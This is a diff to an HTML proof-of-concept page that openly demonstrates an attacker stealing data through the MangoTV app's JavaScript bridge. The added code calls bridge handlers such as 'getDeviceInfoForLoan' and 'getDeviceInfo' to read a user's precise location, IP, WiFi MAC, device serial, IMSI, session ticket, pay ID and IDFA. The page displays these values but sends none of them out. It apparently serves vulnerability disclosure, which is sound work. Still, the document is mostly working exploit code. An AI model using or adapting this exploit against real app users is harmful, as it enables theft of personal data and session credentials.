@@ -32,6 +32,8 @@
 
     <p>An attacker can steal sensitive information such as:</p>
 
+    <p style="font-size: 15px;" id="Location">your Location: </p>
+
     <p style="font-size: 15px;" id="PhoneNumber">your PhoneNumber: </p>
 
     <p style="font-size: 15px;" id="Gender">your Gender: </p>
@@ -42,8 +44,19 @@
     <p style="font-size: 15px;" id="NickName">your NickName: </p>
     <p style="font-size: 15px;" id="PersonalSignature">your PersonalSignature: </p>
 
-    <p style="font-size: 15px;" >your Avatar: </p>
-    <div class="image-with-text"> <img id="Avatar" src="https://avatar.hitv.com/4410843ee89e4066acf180ceeb917882/EMV959wxJwcd.jpg" alt="" width="50%" height="auto"> </div>
+    <p style="font-size: 15px;">your Avatar: </p>
+    <div class="image-with-text">
+        <img id="Avatar" src="https://avatar.hitv.com/4410843ee89e4066acf180ceeb917882/EMV959wxJwcd.jpg" alt=""
+            width="50%" height="auto">
+    </div>
+
+    <p style="font-size: 15px;" id="IP">your IP: </p>
+    <p style="font-size: 15px;" id="WifiMac">your WifiMac: </p>
+    <p style="font-size: 15px;" id="DeviceName">your DeviceName: </p>
+    <p style="font-size: 15px;" id="DeviceSn">your DeviceSN: </p>
+    <p style="font-size: 15px;" id="Imsi">your Device IMSI: </p>
+    <p style="font-size: 15px;" id="UsedStorage">your Device Used Storage: </p>   
+    <p style="font-size: 15px;" id="TotalStorage">your Device Total Storage: </p>
 
     <p style="font-size: 15px;" id="UUID">your MangoTV UUID: </p>
     <p style="font-size: 15px;" id="VIPFingerprint">your MangoTV VIP Fingerprint: </p>
@@ -60,6 +73,12 @@
             WVJBIframe.src = 'https://__bridge_loaded__';
             document.documentElement.appendChild(WVJBIframe);
             setTimeout(function () { document.documentElement.removeChild(WVJBIframe) }, 0)
+        }
+
+        function convertToGB(bytes) {
+            var sizeInBytes = parseInt(bytes);
+            var sizeInGB = sizeInBytes / (1024 * 1024 * 1024);
+            return sizeInGB.toFixed(3) + "GB";
         }
 
         setupWebViewJavascriptBridge(function (bridge) {
@@ -85,14 +104,35 @@
                 document.getElementById("VIPFingerprint").innerText = "your MangoTV VIP Fingerprint: " + json.vipinfo.ext.fingerprint;
 
                 document.getElementById("ProvinceAndCity").innerText = "your Province and City: " + json.province + " " + json.city;
+            });
 
-                
-                
+            bridge.callHandler('getDeviceInfoForLoan', {}, function (response) {
+                var json = JSON.parse(response.data);
 
+                document.getElementById("Location").innerText = "your Location: " + json.app_location.address + " (" + json.app_location.lat + ", " + json.app_location.lon + ")";
+
+                document.getElementById("IP").innerText = "your IP: " + json.trueIp;
+                document.getElementById("WifiMac").innerText = "your WifiMac: " + json.WifiMac;
+                document.getElementById("DeviceName").innerText = "your DeviceName: " + json.deviceName;
+                document.getElementById("DeviceSn").innerText = "your DeviceSN: " + json.deviceSn;
+                document.getElementById("Imsi").innerText = "your Device IMSI: " + json.imsi;
+
+                document.getElementById("UsedStorage").innerText = "your Device Used Storage: " + convertToGB(json.usedStorage);
+                document.getElementById("TotalStorage").innerText = "your Device Total Storage: " + convertToGB(json.totalStorage);
+            });
+
+            bridge.callHandler('getDeviceInfo', {}, function (response) {
+                var json = JSON.parse(response.data);
+
+                document.getElementById("Ticket").innerText = "your MangoTV Ticket: " + json.ticket;
+                document.getElementById("Paid").innerText = "your MangoTV Pay ID: " + json.paid;
+                document.getElementById("GUID").innerText = "your MangoTV GUID: " + json.guid;
+
+                document.getElementById("IDFA").innerText = "your Device IDFA: " + json.idfa;
 
             });
-        })
 
+        })
 
     </script>
 
